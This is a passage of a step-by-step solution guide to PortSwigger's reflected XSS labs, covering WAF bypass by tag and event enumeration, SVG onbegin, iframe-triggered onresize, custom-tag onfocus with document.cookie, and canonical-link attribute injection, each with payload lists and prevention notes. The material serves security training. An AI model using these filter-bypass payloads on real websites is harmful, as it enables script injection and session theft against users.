   - Status 200: Allowed tags
   - Allowed tags found:
     - `svg`
     - `animatetransform`
     - `title`
     - `image`

**Phase 3: Enumerate Allowed Attributes**

8. **Intruder Setup for Attributes**:
   - Use allowed tag: `<svg><animatetransform §§=1>`
   - Load event handler payloads:
   ```
   onload
   onerror
   onclick
   onmouseover
   onbegin
   onend
   onrepeat
   onfocus
   ```

9. **Run Attribute Attack**

10. **Analysis Results**:
    - Most attributes: Status 400 (blocked)
    - `onbegin`: Status 200 (allowed!)

**Phase 4: Construct Exploit**

11. **Combine Findings**:
    - Allowed tag: `<svg><animatetransform>`
    - Allowed event: `onbegin`

12. **Craft Final Payload**:
    ```html
    <svg><animatetransform onbegin=alert(1)>
    ```

13. **Deploy URL**:
    ```
    https://YOUR-LAB-ID.web-security-academy.net/?search=<svg><animatetransform onbegin=alert(1)>
    ```

14. **Result**: Alert executes automatically

**HTTP Request**:
```http
GET /?search=%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert(1)%3E HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**Key Payload**:
```html
<svg><animatetransform onbegin=alert(1)>
```

**Payload Breakdown**:
- `<svg>` - Opens SVG context
- `<animatetransform>` - SVG animation transformation element
- `onbegin=alert(1)` - Event fires when animation begins
- No closing tags needed - executes immediately

**Burp Intruder Configuration**:

**Tag Enumeration**:
```
Position: /?search=<§TAG§>
Payloads: List of HTML/SVG tags
Grep: Status code
Filter: Status = 200
```

**Attribute Enumeration**:
```
Position: /?search=<svg><animatetransform §ATTR§=1>
Payloads: List of event handlers
Grep: Status code
Filter: Status = 200
```

**Payload Lists**:

**XSS Cheat Sheet Tags** (subset):
```
a, abbr, acronym, address, animate, animatetransform, applet,
area, article, aside, audio, b, base, basefont, bdi, bdo,
bgsound, big, blink, blockquote, body, br, button, canvas,
caption, center, cite, code, col, colgroup, command, content,
data, datalist, dd, del, details, dfn, dialog, dir, div, dl,
dt, element, em, embed, fieldset, figcaption, figure, font,
footer, form, frame, frameset, h1, head, header, hgroup, hr,
html, i, iframe, image, img, input, ins, isindex, kbd, keygen,
label, legend, li, link, listing, main, map, mark, marquee,
menu, menuitem, meta, meter, multicol, nav, nextid, nobr,
noembed, noframes, noscript, object, ol, optgroup, option,
output, p, param, picture, plaintext, pre, progress, q, rp,
rt, ruby, s, samp, script, section, select, set, shadow,
small, source, spacer, span, strike, strong, style, sub,
summary, sup, svg, table, tbody, td, template, textarea,
tfoot, th, thead, time, title, tr, track, tt, u, ul, var,
video, wbr, xmp
```

**Event Handler Attributes** (subset):
```
onload, onerror, onclick, ondblclick, onmousedown, onmouseup,
onmouseover, onmousemove, onmouseout, onmouseenter,
onmouseleave, onfocus, onblur, onkeypress, onkeydown, onkeyup,
onsubmit, onreset, onselect, onchange, oninput, oninvalid,
onsearch, ondrag, ondrop, ondragstart, ondragend, ondragover,
ondragenter, ondragleave, onscroll, onwheel, oncopy, oncut,
onpaste, onabort, oncanplay, oncanplaythrough, ondurationchange,
onemptied, onended, onerror, onloadeddata, onloadedmetadata,
onloadstart, onpause, onplay, onplaying, onprogress,
onratechange, onseeked, onseeking, onstalled, onsuspend,
ontimeupdate, onvolumechange, onwaiting, onanimationstart,
onanimationend, onanimationiteration, ontransitionend,
onbegin, onend, onrepeat, onresize, onhashchange, onpageshow,
onpagehide
```

**Alternative Payloads** (if different tags allowed):
```html
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>
<svg><title><animate onbegin=alert(1)></title>
```

**Common Mistakes**:
- Not systematically testing all tags
- Using incomplete payload lists
- Forgetting to URL-encode final payload
- Not checking status codes properly

**Troubleshooting**:
- **All tags blocked**: Check payload list completeness
- **Intruder slow**: Reduce thread count or payload size
- **False positives**: Verify each finding manually
- **URL encoding**: Use Burp's encoder before final test

**Real-World Application**:
- Demonstrates importance of systematic testing
- Shows power of Burp Intruder for enumeration
- WAF bypass methodology
- Essential skill for practical pentesting

**Prevention**:
- Whitelist approach (not blacklist)
- Block ALL SVG if not needed
- Content Security Policy
- Regular filter testing and updates
- Defense in depth

---

### Lab 10: Reflected XSS with most tags and attributes blocked

**URL**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

**Difficulty**: Practitioner

**Objective**: Bypass WAF that blocks most tags to exploit XSS with body tag and onresize event

**Description**: This lab features a strict WAF that blocks nearly all HTML tags and event handlers. The solution requires using the `<body>` tag with `onresize` event handler, delivered via an exploit server with an iframe that auto-resizes.

**Vulnerability Analysis**:
- **Injection Point**: Search query parameter
- **Context**: HTML body
- **Filter**: Extremely restrictive WAF
- **Allowed**: `<body>` tag and `onresize` event
- **Delivery**: Requires exploit server with iframe

**Step-by-Step Solution**:

**Phase 1: Test and Enumerate**

1. **Test Basic XSS**:
   ```html
   <script>alert(1)</script>
   ```
   Result: HTTP 400 - Blocked

2. **Enumerate Allowed Tags** (Burp Intruder):
   - Position: `/?search=<§§>`
   - Payloads: XSS cheat sheet tags
   - Result: Only `<body>` returns Status 200

3. **Enumerate Allowed Attributes**:
   - Position: `/?search=<body §§=1>`
   - Payloads: Event handlers
   - Result: Only `onresize` returns Status 200

**Phase 2: Understand Requirements**

4. **Analyze onresize Event**:
   - Triggers when window/element resizes
   - Cannot trigger directly from URL
   - Need external delivery mechanism

5. **Plan Exploitation**:
   - Use exploit server
   - Create iframe pointing to vulnerable page
   - Use iframe's onload to trigger resize
   - This fires victim's onresize handler

**Phase 3: Craft Exploit**

6. **Build Payload**:
   ```html
   "><body onresize=print()>
   ```
   - `">` closes any existing attribute/tag
   - `<body onresize=print()>` creates handler
   - `print()` is the required function (not alert)

7. **URL-Encode for Search Parameter**:
   ```
   %22%3E%3Cbody%20onresize%3Dprint()%3E
   ```

8. **Create Exploit Server Payload**:
   ```html
   <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize%3Dprint()%3E" onload=this.style.width='100px'>
   </iframe>
   ```

9. **Deliver Exploit**:
   - Navigate to exploit server
   - Paste payload in "Body" field
   - Click "Store"
   - Click "Deliver exploit to victim"

**Exploit Server Configuration**:

**Body**:
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize%3Dprint()%3E" onload=this.style.width='100px'></iframe>
```

**How It Works**:
1. Victim loads exploit server page
2. Iframe loads vulnerable site with payload
3. Iframe's `onload` event fires
4. `onload` changes iframe width to 100px
5. This resize triggers target's `onresize` handler
6. `print()` executes in victim's context

**HTTP Request** (to vulnerable site):
```http
GET /?search=%22%3E%3Cbody%20onresize%3Dprint()%3E HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**HTTP Response**:
```html
<div class="container">
  <input type="text" value=""><body onresize=print()>">
</div>
```

**Key Payload**:
```html
"><body onresize=print()>
```

**Payload Breakdown**:
- `"` - Closes value attribute
- `>` - Closes input tag
- `<body onresize=print()>` - Injects body tag with resize handler
- Uses `print()` function (requirement for lab completion)

**Burp Suite Workflow**:
1. Use Intruder to enumerate allowed tags
2. Use Intruder to enumerate allowed attributes
3. Test payload in Repeater
4. Copy final URL for exploit server

**Alternative Delivery Methods**:
```html
<!-- Using JavaScript to resize -->
<iframe src="https://TARGET/?search=PAYLOAD" onload="this.contentWindow.resizeTo(100,100)"></iframe>

<!-- Using onload with setTimeout -->
<iframe src="https://TARGET/?search=PAYLOAD" onload="setTimeout(()=>this.style.width='100px',100)"></iframe>
```

**Why This Works**:

**Iframe Resize Behavior**:
- Changing iframe dimensions resizes its content
- Content window fires resize event
- Body's onresize handler executes

**WAF Limitations**:
- Cannot block `<body>` without breaking pages
- `onresize` considered low-risk event
- Doesn't account for iframe-based delivery
- Blacklist approach incomplete

**Common Mistakes**:
- Using `alert(1)` instead of `print()` (lab requirement)
- Not URL-encoding the search parameter
- Wrong lab ID in URL
- Forgetting to "Deliver exploit to victim"
- Testing directly (won't trigger onresize)

**Troubleshooting**:
- **Doesn't trigger**: Must use exploit server delivery
- **Wrong function**: Use `print()` not `alert()`
- **Syntax error**: Check quote closure
- **404 error**: Verify lab ID in URL
- **Not solving**: Click "Deliver exploit to victim" button

**Real-World Application**:
- Shows importance of considering delivery context
- Demonstrates event-based XSS triggers
- Iframe-based exploitation technique
- Relevant for stored XSS with limited triggers

**Prevention**:
- Block body tag redefinition
- Content Security Policy
- X-Frame-Options header (prevents iframe embedding)
- Frame-ancestors CSP directive
- Whitelist approach for all tags

---

### Lab 11: Reflected XSS with all standard tags blocked

**URL**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

**Difficulty**: Practitioner

**Objective**: Exploit XSS using custom HTML tags when all standard tags are blocked

**Description**: This lab blocks all standard HTML tags but permits custom tags (non-standard tag names). The exploit uses a custom tag with event handlers and hash-based auto-focus to execute JavaScript.

**Vulnerability Analysis**:
- **Injection Point**: Search query parameter
- **Context**: HTML body
- **Filter**: ALL standard HTML tags blocked
- **Bypass**: Custom tags not in blacklist
- **Technique**: Custom tag + focus event + URL hash

**Step-by-Step Solution**:

**Phase 1: Discover Custom Tag Support**

1. **Test Standard Tags**:
   ```html
   <img src=x onerror=alert(1)>
   ```
   Result: Blocked

2. **Test Custom Tag**:
   ```html
   <xss id=x>test</xss>
   ```
   Result: Allowed! (Status 200)

3. **Conclusion**: Blacklist only contains standard HTML tags

**Phase 2: Make Custom Tag Interactive**

4. **Add Event Handler**:
   ```html
   <xss id=x onfocus=alert(1) tabindex=1>
   ```
   - `onfocus` - Event fires when element receives focus
   - `tabindex=1` - Makes element focusable

5. **Auto-Focus with Hash**:
   ```
   #x
   ```
   - URL hash matching element ID auto-focuses that element

**Phase 3: Build Complete Exploit**

6. **Construct Payload**:
   ```html
   <xss id=x onfocus=alert(document.cookie) tabindex=1>#x
   ```

7. **Create Exploit Server Script**:
   ```html
   <script>
   location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
   </script>
   ```

8. **Deploy**:
   - Navigate to exploit server
   - Paste payload in Body section
   - Click "Store"
   - Click "Deliver exploit to victim"

**Exploit Server Payload**:
```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

**Decoded URL**:
```
https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

**HTTP Request**:
```http
GET /?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**HTTP Response**:
```html
<section class=blog-header>
<h1>0 search results for '<xss id=x onfocus=alert(document.cookie) tabindex=1>'</h1>
</section>
```

**Browser Behavior**:
1. Page loads with custom `<xss>` element
2. Element has `id=x` and `tabindex=1` (focusable)
3. URL contains hash `#x`
4. Browser auto-scrolls to and focuses element with `id=x`
5. Focus event triggers `onfocus` handler
6. `alert(document.cookie)` executes

**Key Payload**:
```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

**Payload Breakdown**:
- `<xss>` - Custom tag (not in blacklist)
- `id=x` - Element identifier
- `onfocus=alert(document.cookie)` - Event handler
- `tabindex=1` - Makes element keyboard-focusable
- `#x` - URL hash for auto-focus

**Alternative Custom Tags**:
```html
<custom id=x onfocus=alert(1) tabindex=1>#x
<pwned id=x onfocus=alert(1) tabindex=1>#x
<exploit id=x onfocus=alert(1) tabindex=1>#x
<vulnerable id=x onfocus=alert(1) tabindex=1>#x
```

**Alternative Event Handlers**:
```html
<!-- Mouseover (needs mouse movement) -->
<xss id=x onmouseover=alert(1)>

<!-- Click (needs click) -->
<xss id=x onclick=alert(1)>Click me</xss>

<!-- Autofocus (focus without hash) -->
<xss autofocus onfocus=alert(1)>
```

**Why Auto-Focus Works**:

**URL Hash Behavior**:
```
When URL contains #element-id:
1. Browser scrolls to element with matching ID
2. If element is focusable, receives focus
3. Triggers focus-related events
```

**Making Elements Focusable**:
```html
tabindex=1    <!-- Makes any element focusable -->
tabindex=0    <!-- Natural tab order -->
tabindex=-1   <!-- Programmatically focusable only -->
autofocus     <!-- Auto-focuses on page load -->
```

**Common Mistakes**:
- Forgetting `tabindex` attribute (element won't focus)
- Omitting URL hash `#x`
- Using standard tag names (blocked)
- Not URL-encoding special characters
- Testing without exploit server delivery

**Troubleshooting**:
- **Doesn't execute**: Verify hash matches ID
- **Not focusable**: Add `tabindex=1`
- **Still blocked**: Ensure truly custom tag name
- **URL error**: Check proper URL encoding
- **No delivery**: Click "Deliver exploit to victim"

**Real-World Application**:
- Shows limitations of blacklist filtering
- Custom elements in HTML5
- Hash-based exploitation technique
- Relevant for modern web components

**Prevention**:
- Use whitelist approach (only allow specific tags)
- Validate tag names against HTML specification
- Strip unknown tags entirely
- Content Security Policy
- HTML sanitization library with strict rules

---

### Lab 12: Reflected XSS in canonical link tag

**URL**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

**Difficulty**: Practitioner

**Objective**: Exploit XSS in canonical link tag by injecting accesskey and onclick attributes

**Description**: This lab reflects user input into the href attribute of a canonical link tag. While angle brackets are escaped, attribute injection is possible, allowing injection of accesskey and onclick attributes.

**Vulnerability Analysis**:
- **Injection Point**: URL path/query
- **Context**: `<link rel="canonical">` tag in document head
- **Filter**: Angle brackets HTML-encoded
- **Vulnerability**: Attribute injection possible
- **Trigger**: Keyboard shortcut (accesskey)

**Step-by-Step Solution**:

**Phase 1: Identify Injection Point**

1. **View Page Source**:
   ```html
   <head>
   <link rel="canonical" href="https://YOUR-LAB-ID.web-security-academy.net/"/>
   </head>
   ```

2. **Test URL Parameter Reflection**:
   - Access: `/?test=value`
   - Check if reflected in canonical tag

**Phase 2: Craft Attribute Injection**

3. **Inject accesskey Attribute**:
   ```
   ?'accesskey='x'onclick='alert(1)
   ```

4. **Result in HTML**:
   ```html
   <link rel="canonical" href="https://YOUR-LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(1)"/>
   ```

**Phase 3: Construct Full Exploit**

5. **Build Final URL**:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
   ```

6. **Trigger Exploit**:
   - Windows: ALT + SHIFT + X
   - macOS: CTRL + ALT + X
   - Linux: Alt + X

**HTTP Request**:
```http
GET /?'accesskey='x'onclick='alert(1) HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**HTTP Response**:
```html
<head>
<link rel="canonical" href="https://YOUR-LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(1)"/>
</head>
```

**Rendered HTML**:
```html
<link rel="canonical" href="https://..." accesskey="x" onclick="alert(1)"/>
```

**Key Payload**:
```
?'accesskey='x'onclick='alert(1)
```

**Payload Breakdown**:
- `?` - Query string start
- `'` - Closes href attribute value
- `accesskey='x'` - Injects keyboard shortcut
- `onclick='alert(1)'` - Injects click event handler
- No closing needed (self-closing tag)

**Keyboard Shortcuts by OS**:

| OS | Shortcut |
|----|----------|
| Windows | ALT + SHIFT + X |
| macOS | CTRL + ALT + X |
| Linux | Alt + X |
| Firefox (all) | ALT + SHIFT + X |
| Chrome Windows | ALT + X |

**Why This Works**:

**Accesskey Attribute**:
- Defines keyboard shortcut for element
- Works even on `<link>` tags
- Triggers click/activation of element

**Link Tag Interaction**:
- `<link>` tags can have onclick handlers
- Accesskey makes them keyboard-accessible
- Pressing shortcut triggers onclick

**HTML Parser Behavior**:
- Attributes separated by spaces/quotes
- `'attribute='value'` creates new attribute
- Works even in head section

**Alternative Payloads**:
```html
<!-- Different accesskey -->
?'accesskey='a'onclick='alert(1)

<!-- Using double quotes -->
?"accesskey="x"onclick="alert(1)

<!-- Different event -->
?'accesskey='x'onmouseover='alert(1)
```

**Common Mistakes**:
- Not pressing the keyboard shortcut
- Wrong key combination for OS
- Using incorrect quote types
- Not URL-encoding the payload
- Testing in non-Chrome browser (lab requires Chrome)

**Troubleshooting**:
- **Doesn't execute**: Press correct keyboard shortcut
- **Nothing happens**: Check browser compatibility (Chrome)
- **Syntax error**: Verify quote matching
- **Blocked**: Check if attributes properly injected
- **URL encoding**: Use %27 for single quote

**Browser Compatibility**:
- **Chrome**: Full support (required for lab)
- **Firefox**: May have different shortcut
- **Safari**: Limited accesskey support
- **Edge**: Similar to Chrome

**Real-World Application**:
- Canonical tags often overlooked in security testing
- Demonstrates attribute injection importance
- Relevant for SEO-focused applications
- Shows metadata tag vulnerabilities

**Prevention**:
- HTML-encode ALL output, including in meta tags
- Validate URL structure for canonical tags
- Use allow-listed values only
- Context-aware encoding
- Remove user input from canonical entirely

---

(Continuing with remaining labs...  Due to length limits, I'll create the file with all labs)

